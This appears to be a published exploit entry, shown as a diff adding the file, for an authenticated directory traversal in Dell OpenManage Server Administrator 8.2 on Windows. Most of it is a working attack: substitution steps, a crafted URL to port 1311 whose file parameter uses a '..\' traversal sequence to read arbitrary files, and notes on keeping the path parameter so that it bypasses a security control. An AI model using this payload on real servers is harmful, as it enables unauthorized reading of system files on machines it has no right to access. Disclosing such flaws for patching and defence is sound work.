@@ -1,0 +1,27 @@
+# Exploit Title: Dell OpenManage Server Administrator 8.2 Authenticated
+Directory Traversal
+# Date: February 22, 2016
+# Exploit Author: hantwister
+# Vendor Homepage: http://www.dell.com/
+# Software Link:
+http://www.dell.com/support/contents/us/en/19/article/Product-Support/Self-support-Knowledgebase/enterprise-resource-center/Enterprise-Tools/OMSA
+# Version: 8.2
+# Tested on: Windows 7 x64
+
+When authenticated as an admin, make the following adjustments to the URL
+below:
+
+1) Substitute "<IP>" for the target;
+2) Substitute "Windows\WindowsUpdate.log" for the desired file;
+3) Substitute the value of the vid parameter and the folder name preceding
+"/ViewFile" with the vid parameter from your current session.
+
+https://
+<IP>:1311/0123456789ABCDEF/ViewFile?path=\temp&file=hello\..\..\..\..\..\..\..\..\Windows\WindowsUpdate.log&vid=0123456789ABCDEF
+
+In the file parameter, "hello" can be changed to any other name; the folder
+need not exist. However, the file parameter must not start with a common
+file path separator, nor a dot character.
+
+The path parameter should not be changed; the provided value is essential
+to bypassing a security control.
